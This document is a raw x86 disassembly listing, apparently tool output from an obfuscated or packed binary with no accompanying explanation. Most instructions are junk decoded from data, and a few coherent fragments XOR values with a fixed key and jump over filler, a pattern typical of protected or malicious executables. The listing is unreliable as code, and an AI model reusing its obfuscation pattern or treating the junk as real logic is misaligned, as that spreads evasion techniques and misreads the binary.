  415126:	push   ebx
  415127:	push   es
  415128:	cwde   
  415129:	ret    
  41512a:	fwait
  41512b:	loope  0x41511d
  41512d:	push   ebp
  41512e:	sub    cl,BYTE PTR [esi]
  415130:	mov    dl,0xbf
  415132:	adc    eax,DWORD PTR [eax-0x58]
  415135:	ror    BYTE PTR ds:0xea8820f,cl
  41513b:	cmc    
  41513c:	loop   0x415198
  41513e:	fsubr  QWORD PTR [edi]
  415140:	xchg   BYTE PTR [eax-0x2087a50b],ch
  415146:	push   edx
  415147:	cmp    DWORD PTR [eax-0x33],ebx
  41514a:	push   eax
  41514b:	mov    fs,WORD PTR [edx-0x603bfd49]
  415151:	inc    edi
  415152:	and    BYTE PTR ds:0x51b92c1,dl
  415158:	jae    0x4151c9
  41515a:	in     al,dx
  41515b:	mov    ecx,0x81b796ec
  415160:	inc    ecx
  415161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415162:	in     eax,0x5
  415164:	jge    0x415181
  415166:	(bad)  
  415167:	dec    DWORD PTR [edx+0x5b]
  41516a:	adc    esi,ebx
  41516c:	sbb    eax,0xc1ed2da0
  415171:	dec    esi
  415172:	xor    bh,al
  415174:	scas   al,BYTE PTR es:[edi]
  415175:	call   0x5e6b:0x39549114
  41517c:	mov    ecx,0xe02bd0bb
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fldenv [ebp-0x124c8cc3]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	sbb    dl,ah
  4151b2:	outs   dx,BYTE PTR ds:[esi]
  4151b3:	mov    esp,0xce929b4d
  4151b8:	xor    eax,0x401102d5
  4151bd:	in     al,0xc4
  4151bf:	sub    DWORD PTR [ecx],ebp
  4151c1:	lods   eax,DWORD PTR ds:[esi]
  4151c2:	in     eax,0x87
  4151c4:	xchg   esi,eax
  4151c5:	repz pop ecx
  4151c7:	sbb    DWORD PTR [ecx+esi*4],esi
  4151ca:	xor    BYTE PTR [edi+0x57bd4757],al
  4151d0:	sbb    ebx,DWORD PTR [ebx+0x20]
  4151d3:	mov    esp,0xc57b514e
  4151d8:	cwde   
  4151d9:	xor    ebx,esi
  4151db:	mov    ?,ebx
  4151dd:	das    
  4151de:	popf   
  4151df:	loopne 0x415254
  4151e1:	loopne 0x4151fc
  4151e3:	jbe    0x4151cd
  4151e5:	int    0x12
  4151e7:	dec    ebx
  4151e8:	test   al,0xa1
  4151ea:	and    ecx,edi
  4151ec:	push   ss
  4151ed:	fist   DWORD PTR [esi+0x153e94e0]
  4151f3:	(bad)  
  4151f4:	call   0x133:0x2c7b8d26
  4151fb:	aaa    
  4151fc:	test   al,0x89
  4151fe:	jecxz  0x4151b3
  415200:	xchg   edi,eax
  415201:	jg     0x415272
  415203:	inc    edx
  415204:	add    al,0xdb
  415206:	add    ebp,DWORD PTR [eax]
  415208:	shr    BYTE PTR [esp+ebx*4+0x6ad6a090],cl
  41520f:	cwde   
  415210:	add    ebx,ecx
  415212:	xchg   edi,eax
  415213:	pop    ecx
  415214:	retf   
  415215:	mov    ecx,0xeb2fa4d8
  41521a:	dec    ebp
  41521b:	into   
  41521c:	cs xchg ecx,eax
  41521e:	ss daa 
  415220:	loop   0x4151ca
  415222:	call   0x42afe85e
  415227:	xchg   edi,eax
  415228:	dec    eax
  415229:	xor    ebx,esi
  41522b:	sub    eax,0x17f7655
  415230:	mov    bh,0xd5
  415232:	mov    WORD PTR [edi+0x2],fs
  415235:	dec    ecx
  415236:	leave  
  415237:	pushf  
  415238:	popf   
  415239:	xchg   edx,eax
  41523a:	cmp    DWORD PTR ds:0xc1979b6c,esp
  415240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415241:	into   
  415242:	int3   
  415243:	cmp    DWORD PTR [ecx+0x2ce8a5da],ebp
  415249:	pop    ds
  41524a:	adc    BYTE PTR [eax+0x70025f92],bl
  415250:	mov    dh,0xae
  415252:	(bad)  
  415253:	sar    DWORD PTR [ebx],cl
  415255:	ins    DWORD PTR es:[edi],dx
  415256:	mov    DWORD PTR [edx],edi
  415258:	nop
  415259:	shr    ecx,0x21
  41525c:	inc    edx
  41525d:	xchg   edi,eax
  41525e:	and    eax,ebx
  415260:	aas    
  415261:	(bad)  
  415262:	lea    esp,[esi]
  415264:	aad    0x50
  415266:	xor    ah,BYTE PTR [eax+0x2c9b38c3]
  41526c:	call   0xe98a:0x5af1f5b0
  415273:	mov    cl,0x58
  415275:	sti    
  415276:	ss (bad) 
  415278:	mov    bl,0xe1
  41527a:	cs pop esp
  41527c:	outs   dx,BYTE PTR ds:[esi]
  41527d:	int3   
  41527e:	jl     0x415261
  415280:	fs xor al,0x5d
  415283:	es imul edi,esp,0xd8006bb3
  41528a:	call   0xa9ca6cc8
  41528f:	fdivr  st,st(5)
  415291:	cwde   
  415292:	xor    BYTE PTR [esi],al
  415294:	imul   edx,esi,0x6b
  415297:	xchg   edx,eax
  415298:	xchg   ebp,eax
  415299:	inc    ebp
  41529a:	repnz sub eax,0x9be637f8
  4152a0:	mov    edi,0xab94b901
  4152a5:	pusha  
  4152a6:	lahf   
  4152a7:	fldcw  WORD PTR [ebx-0x3e]
  4152aa:	(bad)  
  4152ab:	rcl    BYTE PTR [eax+0x341cad5e],1
  4152b1:	pop    edx
  4152b2:	jl     0x4152a3
  4152b4:	aaa    
  4152b5:	test   BYTE PTR [ecx+0x67],dh
  4152b8:	mov    eax,ds:0x797c05fa
  4152bd:	inc    ecx
  4152be:	jmp    eax
  4152c0:	inc    esp
  4152c1:	les    ecx,FWORD PTR [ebp-0x2b8fc8a0]
  4152c7:	sbb    BYTE PTR [ecx+ecx*8-0x735d83b],dl
  4152ce:	stc    
  4152cf:	inc    eax
  4152d0:	pop    edi
  4152d1:	inc    ebx
  4152d2:	pusha  
  4152d3:	sti    
  4152d4:	nop
  4152d5:	fnsave ss:[ebx+edx*1]
  4152d9:	jmp    0x4152e4
  4152db:	imul   esp,DWORD PTR [edx-0x28cc74cc],0xffffff82
  4152e2:	mov    esp,0xe9e511b3
  4152e7:	mov    BYTE PTR [edi+ecx*1+0x21],dl
  4152eb:	mov    ah,0xca
  4152ed:	(bad)  
  4152ef:	xor    edi,esp
  4152f1:	dec    esp
  4152f2:	push   ds
  4152f3:	lea    ecx,[eax]
  4152f5:	add    eax,esp
  4152f7:	shl    ah,0x22
  4152fa:	add    edi,DWORD PTR [ecx-0x3]
  4152fd:	int3   
  4152fe:	jg     0x4152f6
  415300:	jmp    0x906303d4
  415305:	xchg   esi,eax
  415306:	fs jns 0x415310
  415309:	mov    eax,0xbe4e8e4
  41530e:	sar    BYTE PTR [ebx-0x1d],1
  415311:	jns    0x41534c
  415313:	mov    dh,0x50
  415315:	pop    ss
  415316:	mov    ebx,DWORD PTR [edx+0x4f685969]
  41531c:	and    dh,bh
  41531e:	mov    dh,0x82
  415320:	stc    
  415321:	xchg   ecx,eax
  415322:	cs into 
  415324:	jmp    0x2d4b:0x84c711a2
  41532b:	push   eax
  41532c:	jl     0x415337
  41532e:	(bad)  
  41532f:	cli    
  415330:	push   es
  415331:	xchg   BYTE PTR [esi],cl
  415333:	xchg   ebx,eax
  415334:	jge    0x415369
  415336:	inc    ebp
  415337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415338:	or     BYTE PTR [edi],ah
  41533a:	mov    edx,0x30bf77a1
  41533f:	dec    eax
  415340:	pushf  
  415341:	inc    esi
  415342:	xor    DWORD PTR [ebx],ebp
  415344:	mov    esp,0xf826bcd8
  415349:	xor    bh,BYTE PTR [edx-0x642e8ed1]
  41534f:	cmp    DWORD PTR [edx-0x69a7f4cf],esp
  415355:	add    DWORD PTR [ebx],eax
  415357:	xor    BYTE PTR [edi-0x24ef4f42],bh
  41535d:	inc    ecx
  41535e:	and    eax,DWORD PTR [edx]
  415360:	jl     0x4152fd
  415362:	ins    BYTE PTR es:[edi],dx
  415363:	lock mul ch
  415366:	or     DWORD PTR [ebx+eax*2-0x17],ebx
  41536a:	jns    0x4153c5
  41536c:	sub    al,0xdb
  41536e:	or     ch,BYTE PTR [edi-0x47]
  415371:	dec    edx
  415372:	and    bl,dh
  415374:	pop    esp
  415375:	ja     0x415334
  415377:	jne    0x415332
  415379:	(bad)  
  41537a:	aam    0xe
  41537c:	out    dx,eax
  41537d:	mov    WORD PTR [edx],gs
  41537f:	add    DWORD PTR [eax+ebx*4],esi
  415382:	xor    DWORD PTR [edi-0x46],esp
  415385:	repnz pop eax
  415387:	enter  0xbf11,0x75
  41538b:	or     ah,BYTE PTR [edx+0x4b]
  41538e:	popa   
  41538f:	mov    esi,0x3d3f6013
  415394:	push   edx
  415395:	loope  0x4153f8
  415397:	lods   eax,DWORD PTR ds:[esi]
  415398:	les    eax,FWORD PTR [ebp+0x6f]
  41539b:	jmp    0x1646cc53
  4153a0:	or     esi,ecx
  4153a2:	(bad)  [ebx]
  4153a4:	stos   DWORD PTR es:[edi],eax
  4153a5:	repnz int 0xbe
  4153a8:	push   0x64
  4153aa:	add    DWORD PTR [eax],edx
  4153ac:	pop    ss
  4153ad:	js     0x415410
  4153af:	mov    edx,cs
  4153b1:	jg     0x4153ce
  4153b3:	popa   
  4153b4:	mov    WORD PTR es:[ecx],gs
  4153b7:	add    bl,BYTE PTR [edx+0x6bc26c0e]
  4153bd:	dec    ebx
  4153be:	xor    dl,dl
  4153c0:	pop    ds
  4153c1:	fidivr DWORD PTR [ebx+edi*2+0x681dd8da]
  4153c8:	adc    bl,ch
  4153ca:	(bad)  
  4153cb:	mov    dh,0x51
  4153cd:	xchg   ebx,eax
  4153ce:	jae    0x415433
  4153d0:	cs (bad) 
  4153d3:	ja     0x41544f
  4153d5:	fild   QWORD PTR [ebx-0x6726422]
  4153db:	sbb    eax,0xa988f870
  4153e0:	jb     0x415437
  4153e2:	ret    
  4153e3:	(bad)  
  4153e4:	xlat   BYTE PTR ds:[ebx]
  4153e5:	cmp    BYTE PTR [edx+0x1a37f666],dh
  4153eb:	dec    ebp
  4153ec:	sbb    eax,0x2f11ddee
  4153f1:	mov    ebp,0x60a1d327
  4153f6:	mov    bl,0x49
  4153f8:	imul   edx,esp,0x27
  4153fb:	jns    0x415479
  4153fd:	rcr    edx,0x1c
  415400:	inc    edx
  415401:	jb     0x41546b
  415403:	das    
  415404:	imul   ecx,DWORD PTR [ebx-0x48],0x17
  415408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415409:	push   ss
  41540a:	push   ecx
  41540b:	jnp    0x4153b6
  41540d:	jb     0x415390
  41540f:	and    edi,ebx
  415411:	inc    esp
  415412:	mov    ds:0x1d2a1d07,al
  415417:	popf   
  415418:	pop    edx
  415419:	sub    al,0xfb
  41541b:	mov    eax,ds:0x8010f6d
  415420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415421:	jmp    0x415458
  415423:	icebp  
  415424:	cmp    DWORD PTR [esi-0x4d],0x4b
  415428:	int3   
  415429:	fs fcmovnu st,st(1)
  41542c:	sbb    DWORD PTR [edi-0x3f18ab90],esi
  415432:	jbe    0x4153c5
  415434:	dec    ecx
  415435:	rcr    ch,0x72
  415438:	sub    BYTE PTR [ebx+edx*1+0xd958338],ch
  41543f:	fwait
  415440:	fwait
  415441:	inc    esp
  415442:	inc    ecx
  415444:	fdivr  DWORD PTR [edi]
  415446:	xchg   edi,eax
  415447:	ins    DWORD PTR es:[edi],dx
  415448:	in     al,0x8d
  41544a:	call   0x1408:0x1fc5d80d
  415451:	push   0xffffffed
  415453:	outs   dx,BYTE PTR fs:[esi]
  415455:	sti    
  415456:	jge    0x415486
  415458:	cmp    ecx,edx
  41545a:	mov    bl,0x88
  41545c:	adc    eax,DWORD PTR [ecx]
  41545e:	imul   esp,esp,0xc6df04b0
  415464:	popf   
  415465:	(bad)  
  415466:	sti    
  415467:	loope  0x415416
  415469:	sub    BYTE PTR [ecx],dl
  41546b:	jl     0x415445
  41546d:	jne    0x41547b
  41546f:	and    bh,BYTE PTR [edx+0x1]
  415472:	push   edx
  415473:	lahf   
  415474:	and    eax,0xc203e295
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x13
  4154c8:	pop    ebp
  4154c9:	loopne 0x4154a9
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0xa370707e
  4154d4:	jb     0x415508
  4154d6:	and    bl,BYTE PTR [edi]
  4154d8:	stos   BYTE PTR es:[edi],al
  4154d9:	xchg   esp,eax
  4154da:	int    0x24
  4154dc:	imul   BYTE PTR [edx]
  4154de:	cmp    eax,0x2e2edbda
  4154e3:	or     ch,BYTE PTR [edx+eiz*8-0x318c457c]
  4154ea:	ins    DWORD PTR es:[edi],dx
  4154eb:	inc    esi
  4154ec:	and    eax,DWORD PTR [ecx+0x4193457e]
  4154f2:	jno    0x4154a1
  4154f4:	pop    eax
  4154f5:	dec    edx
  4154f6:	(bad)  
  4154f7:	push   eax
  4154f8:	stos   DWORD PTR es:[edi],eax
  4154f9:	shl    DWORD PTR [ebp+0x45],cl
  4154fc:	xchg   esp,eax
  4154fd:	outs   dx,BYTE PTR ds:[esi]
  4154fe:	fs dec edx
  415500:	push   esi
  415501:	stos   DWORD PTR es:[edi],eax
  415502:	test   BYTE PTR [ecx+0x78],0x7c
  415506:	into   
  415507:	das    
  415508:	cmp    dl,BYTE PTR [ebp-0x4]
  41550b:	xor    eax,0x67d33766
  415510:	push   ss
  415511:	fdivp  st(6),st
  415513:	xchg   ebx,eax
  415514:	or     eax,0xdd320081
  415519:	sub    bh,al
  41551b:	shr    esp,cl
  41551d:	(bad)  
  41551e:	fimul  WORD PTR [edi+0x3d]
  415521:	sub    DWORD PTR [esi-0x71eaea32],esi
  415527:	je     0x4154cf
  415529:	push   ds
  41552a:	mov    eax,ds:0xad3010ef
  41552f:	sbb    edi,DWORD PTR [edi+0x60]
  415532:	xor    edx,DWORD PTR [edi+0x7504276]
  415538:	pop    edi
  415539:	sub    al,0x11
  41553b:	xor    ebx,esp
  41553d:	scas   eax,DWORD PTR es:[edi]
  41553e:	push   0x17
  415540:	cmc    
  415541:	xchg   esi,eax
  415542:	inc    DWORD PTR [ebx+ecx*4+0x2e]
  415546:	scas   eax,DWORD PTR es:[edi]
  415547:	cmp    BYTE PTR [esi],bh
  415549:	xchg   ebx,eax
  41554a:	add    ch,BYTE PTR [ecx+0xb]
  41554d:	jl     0x415563
  41554f:	ins    DWORD PTR es:[edi],dx
  415550:	cld    
  415551:	mov    ch,0xb
  415553:	push   ebp
  415554:	aad    0x62
  415556:	mov    dh,0x66
  415558:	xor    ebp,DWORD PTR [esp+ecx*2+0x7c70db8c]
  41555f:	or     bl,BYTE PTR [ebp-0x31]
  415562:	mov    esp,0xeceef251
  415567:	dec    esp
  415568:	ss cmc 
  41556a:	xchg   edx,eax
  41556b:	inc    ebx
  41556c:	loop   0x4154f7
  41556e:	jns    0x4154f0
  415570:	int3   
  415571:	xchg   esp,eax
  415572:	push   ss
  415573:	aam    0xdb
  415575:	sub    eax,0xb8c2188c
  41557a:	dec    edi
  41557b:	pop    esp
  41557c:	dec    edx
  41557d:	mov    ecx,0xe6666744
  415582:	adc    BYTE PTR [edx+ebp*8-0x62],bh
  415586:	cmp    ah,BYTE PTR [eax]
  415588:	(bad)  
  415589:	lds    esp,FWORD PTR [edx-0x1a]
  41558c:	cli    
  41558d:	jnp    0x4155ff
  41558f:	addr16 dec esi
  415591:	push   ecx
  415592:	or     ah,BYTE PTR [edi]
  415594:	xor    DWORD PTR [eax+0x69981a0a],eax
  41559a:	pushf  
  41559b:	pop    esp
  41559c:	sbb    ecx,esp
  41559e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41559f:	popa   
  4155a0:	dec    esp
  4155a1:	dec    edx
  4155a2:	fidiv  DWORD PTR [ecx]
  4155a4:	or     eax,0x3ad564e1
  4155a9:	pop    DWORD PTR [ebp+0x33]
  4155ac:	jno    0x4155c7
  4155ae:	js     0x415568
  4155b0:	imul   ecx,ebp,0x23
  4155b3:	(bad)  
  4155b4:	in     eax,0xe4
  4155b6:	std    
  4155b7:	push   edx
  4155b8:	mov    al,ds:0x48f7a664
  4155bd:	push   es
  4155be:	loop   0x415589
  4155c0:	jmp    0x4155c1
  4155c2:	mov    eax,0x50fa7806
  4155c7:	dec    esi
  4155c8:	jle    0x415585
  4155ca:	mov    dl,0xe9
  4155cc:	dec    edi
  4155cd:	loop   0x4155b2
  4155cf:	xchg   DWORD PTR [esi-0x75],ecx
  4155d2:	sub    BYTE PTR cs:[edx-0x66],al
  4155d6:	loop   0x41563b
  4155d8:	out    0x97,eax
  4155da:	xor    ecx,ecx
  4155dc:	dec    esp
  4155dd:	(bad)  
  4155de:	mov    esp,0xbd175d2f
  4155e3:	aaa    
  4155e4:	or     BYTE PTR [edx-0x9],dl
  4155e7:	adc    eax,0xca6c69dd
  4155ec:	jl     0x415607
  4155ee:	xor    DWORD PTR [ebx-0x60],edi
  4155f1:	adc    DWORD PTR [esi],esi
  4155f3:	sti    
  4155f4:	fiadd  WORD PTR [ecx]
  4155f6:	mov    cl,0xf5
  4155f8:	sar    BYTE PTR [edi+0x6c],0x7b
  4155fc:	retf   0xf268
  4155ff:	sbb    edx,DWORD PTR [ecx-0xd]
  415602:	jnp    0x415676
  415604:	inc    ebp
  415605:	push   edx
  415606:	pop    ebp
  415607:	fstp   st(4)
  415609:	dec    esp
  41560a:	xchg   BYTE PTR [eax+0x1e],ch
  41560d:	inc    esp
  41560e:	jmp    0x8456:0x54bf5116
  415615:	out    dx,eax
  415616:	loopne 0x415662
  415618:	push   ebp
  415619:	mov    ebp,0x9af242b8
  41561e:	and    eax,0xb290e6c4
  415623:	adc    ah,0x78
  415626:	inc    edx
  415627:	into   
  415628:	aam    0x76
  41562a:	aad    0xb1
  41562c:	aas    
  41562d:	popf   
  41562e:	pop    ebx
  41562f:	sub    eax,0x17971bfb
  415634:	sti    
  415635:	xchg   ebp,eax
  415636:	cdq    
  415637:	push   ebx
  415638:	(bad)  
  415639:	cmc    
  41563a:	int    0xda
  41563c:	cwde   
  41563d:	cmp    al,0xf8
  41563f:	retf   0xe950
  415642:	stos   BYTE PTR es:[edi],al
  415643:	mov    WORD PTR [ebx-0x57],?
  415646:	push   esp
  415647:	pop    ecx
  415648:	data16 add ah,BYTE PTR [ebx+ebp*4-0x3a]
  41564d:	ret    0xf3d1
  415650:	aaa    
  415651:	in     eax,0x4f
  415653:	dec    eax
  415654:	fwait
  415655:	es sbb eax,0x9a27a4d6
  41565b:	or     BYTE PTR [ebp+0x437c3952],bh
  415661:	mov    ebp,DWORD PTR [ecx+eax*1+0x71f42ffa]
  415668:	xchg   bh,cl
  41566a:	arpl   WORD PTR [ebx-0x7b404b6d],sp
  415670:	arpl   dx,si
  415672:	leave  
  415673:	int3   
  415674:	pusha  
  415675:	mov    ds:0xb2f0a8e1,eax
  41567a:	xor    al,0xe2
  41567c:	cs call 0x7edfc0e9
  415682:	and    edi,eax
  415684:	sti    
  415685:	add    ch,dl
  415687:	cdq    
  415688:	fdiv   QWORD PTR [ebx+0x32]
  41568b:	xor    al,0x4b
  41568d:	imul   edi,DWORD PTR [ebp+0x43],0xffffffdb
  415691:	pop    ebx
  415692:	add    edx,edi
  415694:	pushf  
  415695:	aam    0x50
  415697:	mov    dl,0x82
  415699:	jbe    0x4156c2
  41569b:	jmp    0x415625
  41569d:	jnp    0x41570b
  41569f:	stc    
  4156a0:	or     edx,DWORD PTR [edi+0x17880acf]
  4156a6:	call   0xdfc2:0xee11e0f1
  4156ad:	push   es
  4156ae:	and    dh,dl
  4156b0:	sbb    edi,edi
  4156b2:	mov    al,0x43
  4156b4:	mov    ebx,0x7eb07f07
  4156b9:	sub    al,0x92
  4156bb:	and    ebx,DWORD PTR [edx]
  4156bd:	push   ss
  4156be:	call   0x7fab664
  4156c3:	(bad)  
  4156c4:	and    ecx,DWORD PTR [eax-0x36791a88]
  4156ca:	pop    ebx
  4156cb:	test   BYTE PTR [ebp-0x66cdddd],al
  4156d1:	test   BYTE PTR [ecx],cl
  4156d3:	sbb    al,0xe2
  4156d5:	ins    BYTE PTR es:[edi],dx
  4156d6:	mov    ebx,0xbb4d082f
  4156db:	xchg   al,bh
  4156dd:	jg     0x4156c6
  4156df:	push   0x59
  4156e1:	ins    BYTE PTR es:[edi],dx
  4156e2:	mov    DWORD PTR [esp+eiz*2],ecx
  4156e5:	inc    esp
  4156e6:	jecxz  0x4156ef
  4156e8:	lock pop edx
  4156ea:	clc    
  4156eb:	or     ebx,esp
  4156ed:	popf   
  4156ee:	pop    esp
  4156ef:	xlat   BYTE PTR ds:[ebx]
  4156f0:	dec    ebp
  4156f1:	out    0x55,al
  4156f3:	inc    ecx
  4156f4:	xchg   esi,eax
  4156f5:	push   edi
  4156f6:	sbb    edi,0xa0b7de16
  4156fc:	inc    ecx
  4156fd:	fidiv  DWORD PTR [esi]
  4156ff:	add    dh,BYTE PTR [eax]
  415701:	pop    es
  415702:	ins    DWORD PTR es:[edi],dx
  415703:	cmp    dh,BYTE PTR [ebp+0x68917e83]
  415709:	or     bl,ah
  41570b:	loop   0x4156da
  41570d:	inc    edi
  41570e:	push   es
  41570f:	inc    esp
  415710:	push   ss
  415711:	sub    eax,0x6494fdfd
  415716:	and    eax,0x574fecca
  41571b:	cmp    DWORD PTR [ebx-0x77],ecx
  41571e:	and    ch,bh
  415720:	test   DWORD PTR [esi],0x4d64336b
  415726:	int3   
  415727:	mov    eax,0xf833a
  41572c:	sti    
  41572d:	push   esi
  41572e:	test   eax,0x161df909
  415733:	stc    
  415734:	pop    esi
  415735:	imul   esi,ebx,0x7be5e55b
  41573b:	cld    
  41573c:	push   esp
  41573d:	ret    0x1945
  415740:	mov    eax,0xaa4c053d
  415745:	xchg   ecx,eax
  415746:	test   al,0xf4
  415748:	mov    WORD PTR ds:0x91681a49,fs
  41574e:	inc    ebp
  41574f:	sbb    bh,al
  415751:	push   edx
  415752:	(bad)
  415755:	lods   al,BYTE PTR ds:[esi]
  415756:	hlt    
  415757:	mov    eax,ds:0x76dea878
  41575c:	stc    
  41575d:	les    edi,FWORD PTR [edx]
  41575f:	mov    bl,0x13
  415761:	shr    DWORD PTR [ecx],0x58
  415764:	or     eax,0xf3c538f
  415769:	retf   0x9d4d
  41576c:	dec    eax
  41576d:	scas   eax,DWORD PTR es:[edi]
  41576e:	fnstenv [esi-0x211dbdcd]
  415774:	adc    al,0x1b
  415776:	jne    0x4157a6
  415778:	fisubr WORD PTR [eax+0x3f]
  41577b:	push   ebx
  41577c:	stc    
  41577d:	and    cl,BYTE PTR [edx+0x5f846a39]
  415783:	add    DWORD PTR es:[ebp+0x34],edi
  415787:	rcl    BYTE PTR [ebx+ebx*4],1
  41578a:	push   ebp
  41578b:	mov    ah,0x57
  41578d:	adc    dh,BYTE PTR [edi+0x181f5e37]
  415793:	mov    edi,0x15b43830
  415798:	neg    DWORD PTR [ecx+0x32729cbe]
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   al,dh
  4157b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157b9:	fist   WORD PTR [edx]
  4157bb:	jg     0x4157cc
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0xce70707e
  4157c4:	mov    ebp,0x85ad65b4
  4157c9:	test   DWORD PTR [edx],esp
  4157cb:	cmp    ah,BYTE PTR [eax-0x33]
  4157ce:	cmp    dl,al
  4157d0:	je     0x415764
  4157d2:	fadd   DWORD PTR [ebx]
  4157d4:	pop    edi
  4157d5:	jmp    0x22eb8072
  4157da:	xor    al,BYTE PTR [eax]
  4157dc:	pusha  
  4157dd:	arpl   WORD PTR [ebp+0x7f4801c],cx
  4157e3:	or     BYTE PTR [ebp+0x11f1cf23],dl
  4157e9:	int3   
  4157ea:	repz jle 0x4157bc
  4157ed:	xor    bl,bh
  4157ef:	addr16 stc 
  4157f1:	btc    ecx,esp
  4157f4:	mov    eax,ds:0x4fdaa722
  4157f9:	pop    ds
  4157fa:	test   eax,0xc9d2007e
  4157ff:	ins    BYTE PTR es:[edi],dx
  415800:	repnz or ebx,DWORD PTR [edi]
  415803:	push   ebx
  415804:	sub    ebp,esi
  415806:	mov    ah,0xc8
  415808:	jno    0x415826
  41580a:	or     al,BYTE PTR [ecx]
  41580c:	test   DWORD PTR [edi],esi
  41580e:	sub    BYTE PTR [eax+ebx*4],0xc5
  415812:	add    edx,DWORD PTR [ebx+0x48]
  415815:	dec    edi
  415816:	or     ecx,DWORD PTR [eax+0x2355588e]
  41581c:	pop    esi
  41581d:	in     al,dx
  41581e:	stos   DWORD PTR es:[edi],eax
  41581f:	cmp    ebp,0x73
  415822:	mov    bl,0x5e
  415824:	(bad)  
  415825:	aas    
  415826:	jns    0x4157b8
  415828:	or     al,BYTE PTR [esi+0x61]
  41582b:	int    0x76
  41582d:	cmp    DWORD PTR [esi-0x641038bd],ecx
  415833:	fcomp  st(2)
  415835:	push   cs
  415836:	add    BYTE PTR [esi-0x29fc71c3],ah
  41583c:	ror    DWORD PTR [esi+eiz*4-0x733d5fff],0xe7
  415844:	(bad)  
  415845:	in     eax,0xdd
  415847:	test   eax,0x30049b3c
  41584c:	mov    WORD PTR [eax],?
  41584e:	push   edi
  41584f:	call   0xd2dc0eaa
  415854:	in     al,dx
  415855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415856:	or     DWORD PTR [ebx],0x21
  415859:	scas   al,BYTE PTR es:[edi]
  41585a:	add    BYTE PTR [esi+0x4c15176a],ah
  415860:	in     eax,0xd6
  415862:	outs   dx,BYTE PTR ds:[esi]
  415863:	pop    esi
  415864:	test   eax,0xb49d89b2
  415869:	mov    WORD PTR [ebp+0x49],gs
  41586c:	add    ecx,esp
  41586e:	out    0x6f,eax
  415870:	cmp    ecx,DWORD PTR [eax+0x366d7eb5]
  415876:	xor    BYTE PTR [edx-0x1b],bl
  415879:	fsubr  QWORD PTR [eax+0x13199847]
  41587f:	xchg   eax,ecx
  415881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415882:	outs   dx,DWORD PTR ds:[esi]
  415883:	sub    BYTE PTR [eax-0x14],0x3
  415887:	jg     0x4158af
  415889:	adc    esp,edx
  41588b:	jb     0x415874
  41588d:	mov    edi,0x3c47f8bc
  415892:	pop    ds
  415893:	inc    esp
  415894:	ja     0x4158de
  415896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415897:	xchg   ebp,eax
  415898:	mov    dl,0xd6
  41589a:	push   eax
  41589b:	fwait
  41589c:	dec    ebp
  41589d:	push   esi
  41589e:	and    DWORD PTR [ebp+edx*8+0x4d],esi
  4158a2:	dec    ecx
  4158a3:	inc    edx
  4158a4:	outs   dx,BYTE PTR ds:[esi]
  4158a5:	xor    al,0x5e
  4158a7:	sbb    BYTE PTR [ebx+eiz*1],0x6d
  4158ab:	mov    edx,0x26274c60
  4158b0:	test   al,0xac
  4158b2:	jle    0x4158d3
  4158b4:	adc    ebp,DWORD PTR es:[edx-0x1ae27630]
  4158bb:	je     0x4158e8
  4158bd:	mov    ds,WORD PTR [ecx]
  4158bf:	es ret 
  4158c1:	and    esi,DWORD PTR [ecx-0x23]
  4158c4:	or     al,0x5e
  4158c6:	out    0xee,eax
  4158c8:	jne    0x41591c
  4158ca:	daa    
  4158cb:	cmc    
  4158cc:	xor    DWORD PTR [ebp-0x45],esi
  4158cf:	outs   dx,BYTE PTR ds:[esi]
  4158d0:	outs   dx,DWORD PTR ds:[esi]
  4158d1:	popf   
  4158d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d3:	adc    DWORD PTR [ebp+0x64ad64ac],ebp
  4158d9:	dec    ebp
  4158da:	add    eax,0xceb6cb7f
  4158df:	arpl   WORD PTR ds:0x13724431,bx
  4158e5:	mov    cl,BYTE PTR [eax-0x2a5d5965]
  4158eb:	inc    ecx
